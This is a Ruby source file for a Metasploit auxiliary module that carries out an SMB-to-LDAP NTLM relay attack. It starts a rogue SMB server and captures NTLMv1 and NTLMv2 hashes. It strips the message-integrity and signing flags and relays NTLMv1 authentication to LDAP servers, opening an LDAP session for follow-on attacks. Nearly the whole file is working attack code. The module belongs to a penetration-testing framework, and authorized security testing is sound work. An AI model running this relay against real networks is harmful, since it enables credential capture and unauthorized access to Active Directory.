##
# This module requires Metasploit: https://metasploit.com/download
# Current source: https://github.com/rapid7/metasploit-framework
##

class MetasploitModule < Msf::Auxiliary
  include Msf::Exploit::Remote::SMB::RelayServer
  include Msf::Auxiliary::CommandShell

  def initialize(info = {})
    super(
      update_info(
        info,
        'Name' => 'Microsoft Windows SMB to LDAP Relay',
        'Description' => %q{
          This module supports running an SMB server which validates credentials, and
          then attempts to execute a relay attack against an LDAP server on the
          configured RHOSTS hosts.

          It is not possible to relay NTLMv2 to LDAP due to the Message Integrity Check
          (MIC). As a result, this will only work with NTLMv1. The module takes care of
          removing the relevant flags to bypass signing.

          If the relay succeeds, an LDAP session to the target will be created. This can
          be used by any modules that support LDAP sessions, like `admin/ldap/rbcd` or
          `auxiliary/gather/ldap_query`.

          Supports SMBv2, SMBv3, and captures NTLMv1 as well as NTLMv2 hashes.
          SMBv1 is not supported - please see https://github.com/rapid7/metasploit-framework/issues/16261
        },
        'Author' => [
          'Spencer McIntyre', # This module & LDAP relay library
          'Christophe De La Fuente' # This module & SMB relay updates
        ],
        'License' => MSF_LICENSE,
        'DefaultTarget' => 0,
        'Actions' => [
          [ 'CREATE_LDAP_SESSION', { 'Description' => 'Create an LDAP session' } ]
        ],
        'PassiveActions' => [ 'CREATE_LDAP_SESSION' ],
        'DefaultAction' => 'CREATE_LDAP_SESSION',
        'Notes' => {
          'Stability' => [ CRASH_SAFE ],
          'Reliability' => [ REPEATABLE_SESSION ],
          'SideEffects' => [ IOC_IN_LOGS, ACCOUNT_LOCKOUTS ]
        }
      )
    )

    register_options(
      [
        Opt::RPORT(389)
      ]
    )

    register_advanced_options(
      [
        OptBool.new('RANDOMIZE_TARGETS', [true, 'Whether the relay targets should be randomized', true]),
        OptInt.new('SessionKeepalive', [true, 'Time (in seconds) for sending protocol-level keepalive messages', 10 * 60])
      ]
    )
  end

  def relay_targets
    Msf::Exploit::Remote::SMB::Relay::TargetList.new(
      :ldap, # TODO: look into LDAPs
      datastore['RPORT'],
      datastore['RHOSTS'],
      datastore['TARGETURI'],
      randomize_targets: datastore['RANDOMIZE_TARGETS'],
      drop_mic_only: true,
      drop_mic_and_sign_key_exch_flags: true
    )
  end

  def check_options
    unless framework.features.enabled?(Msf::FeatureManager::LDAP_SESSION_TYPE)
      fail_with(Failure::BadConfig, 'This module requires the `ldap_session_type` feature to be enabled. Please enable this feature using `features set ldap_session_type true`')
    end
  end

  def run
    check_options

    start_service
    print_status('Server started.')

    # Wait on the service to stop
    service.wait if service
  end

  def on_relay_success(relay_connection:, relay_identity:)
    print_good('Relay succeeded')
    session_setup(relay_connection, relay_identity)
  rescue StandardError => e
    elog('Failed to setup the session', error: e)
  end

  # @param [Msf::Exploit::Remote::SMB::Relay::NTLM::Target::LDAP::Client] relay_connection
  # @return [Msf::Sessions::LDAP]
  def session_setup(relay_connection, relay_identity)
    client = relay_connection.create_ldap_client
    ldap_session = Msf::Sessions::LDAP.new(
      relay_connection.socket,
      {
        client: client,
        keepalive_seconds: datastore['SessionKeepalive']
      }
    )
    domain, _, username = relay_identity.partition('\\')
    datastore_options = {
      'DOMAIN' => domain,
      'USERNAME' => username
    }
    start_session(self, nil, datastore_options, false, ldap_session.rstream, ldap_session)
  end
end
